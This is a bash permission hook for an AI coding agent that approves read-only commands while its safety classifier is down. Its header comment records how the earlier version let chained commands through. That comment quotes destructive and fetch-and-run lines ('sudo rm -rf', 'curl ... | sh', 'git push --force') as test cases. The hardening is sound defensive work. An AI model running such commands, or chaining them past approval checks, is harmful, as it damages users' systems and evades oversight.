#!/bin/bash
# classifier-fallback-allow.sh — Allow read-only commands when Auto Mode classifier is unavailable
#
# Solves: Auto Mode's safety classifier (Sonnet) sometimes goes down.
#         When it does, ALL commands get blocked — even cat, ls, grep.
#         (#39259, #38618, #38537)
#
# How it works: PermissionRequest hook that approves read-only commands
#               regardless of classifier status. Only fires on PermissionRequest
#               (the permission prompt), not on normal PreToolUse.
#
# Usage: Add to settings.json as a PermissionRequest hook
#
# {
#   "hooks": {
#     "PermissionRequest": [{
#       "matcher": "Bash",
#       "hooks": [{ "type": "command", "command": "~/.claude/hooks/classifier-fallback-allow.sh" }]
#     }]
#   }
# }
#
# TRIGGER: PermissionRequest  MATCHER: ""
#
# Rewritten 2026-08-03. The base command was taken from the first word of the
# whole line — `awk '{print $1}'` — and the approval was then handed to the
# entire line. Measured against the shipped copy, over the 33 commands this
# hook actually approves in their bare form:
#
#   tail `&& sudo rm -rf /var/app`      -> 99/99 approvals kept
#   tail `; curl http://... | sh`       -> 99/99 approvals kept
#   tail `&& git push --force`          -> 99/99 approvals kept
#
# The control matters: the same five dangerous commands on their own were
# approved 0/5 times. So this was never "approves anything" — it was "never
# reads past the first command position". Those are different repairs.
#
# This is the defect PR #937 fixed in `allowlist.sh`, #940 in `cd-git-allow.sh`
# and #941/#942/#943 across the other approving hooks, on the side that signs
# off rather than the side that blocks. A missed block is a miss; a wrong
# approval is a signature.
#
# Now every command position has to qualify on its own. A line that does not
# qualify gets no decision, which drops it into the normal permission flow —
# this hook only ever adds approval, it never blocks.
#
# Known limit: quotes are not parsed, so a separator inside a quoted string
# ends a segment early. That errs toward fewer approvals, never more.

INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)

[ -z "$COMMAND" ] && exit 0

# A substitution can carry a command that no string-level read ever sees.
case "$COMMAND" in
    *'$('*|*'`'*) exit 0 ;;
esac

# Anything that writes to a file is not a read, whatever the command word says.
case "$COMMAND" in
    *'>'*) exit 0 ;;
esac

# Read-only command words: file inspection, text search, shell builtins and
# data formatters. `git` is handled separately because only some of its
# subcommands read.
# (No comments inside the pattern list — a `#` after a `\` continuation becomes
# part of the pattern, not a comment.)
cc_ro_base_ok() {
    case "$1" in
        cat|head|tail|less|more|wc|file|stat|du|df|ls|tree|\
        which|whereis|type|realpath|readlink|basename|dirname|\
        grep|rg|ag|ack|\
        echo|printf|true|false|pwd|env|printenv|date|uname|hostname|whoami|id|\
        jq|yq)
            return 0 ;;
    esac
    return 1
}

# Filters that only make sense downstream of something else. Keeping them out of
# the first position means `cut …` on its own is not read as a read.
cc_filter_base_ok() {
    case "$1" in
        head|tail|grep|wc|sort|uniq|tr|cut|column|nl|rev|less|more) return 0 ;;
    esac
    return 1
}

cc_segment_base() {
    # strip leading blanks and leading VAR=value assignments, then take the
    # command word without its directory
    printf '%s' "$1" \
        | sed -E 's/^[[:space:]]+//; s/^([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*//' \
        | awk '{print $1}' \
        | sed 's|.*/||'
}

cc_segment_reads() {
    local seg="$1" idx="$2" base
    base=$(cc_segment_base "$seg")
    [ -z "$base" ] && return 1

    # moving between directories reads nothing and writes nothing
    [ "$base" = "cd" ] && return 0

    # find reads only while it carries no predicate that acts on what it finds.
    # The old check looked for `-delete` anywhere in the whole line, which both
    # missed `-exec` and fired on unrelated segments.
    if [ "$base" = "find" ]; then
        printf '%s' "$seg" \
            | grep -qE '(^|[[:space:]])-(delete|exec|execdir|ok|okdir|fprintf?|fls|fprint0)([[:space:]]|$)' \
            && return 1
        return 0
    fi

    cc_ro_base_ok "$base" && return 0

    # git, only the subcommands that read
    if printf '%s' "$seg" | grep -qE '^[[:space:]]*git[[:space:]]+(status|log|diff|show|branch|tag|remote|describe|rev-parse|blame|shortlog|ls-files|ls-tree)([[:space:]]|$)'; then
        return 0
    fi

    # downstream positions may also be a plain filter
    [ "$idx" -gt 0 ] && cc_filter_base_ok "$base" && return 0

    return 1
}

IDX=0
while IFS= read -r SEG; do
    SEG="${SEG#"${SEG%%[![:space:]]*}"}"
    SEG="${SEG%"${SEG##*[![:space:]]}"}"
    [ -z "$SEG" ] && continue
    cc_segment_reads "$SEG" "$IDX" || exit 0
    IDX=$((IDX + 1))
done <<EOF
$(printf '%s' "$COMMAND" | tr ';&|' '\n\n\n')
EOF

# nothing to approve if the line held no command at all
[ "$IDX" -eq 0 ] && exit 0

jq -n '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","permissionDecision":"allow","permissionDecisionReason":"Read-only command (classifier fallback)"}}'
exit 0
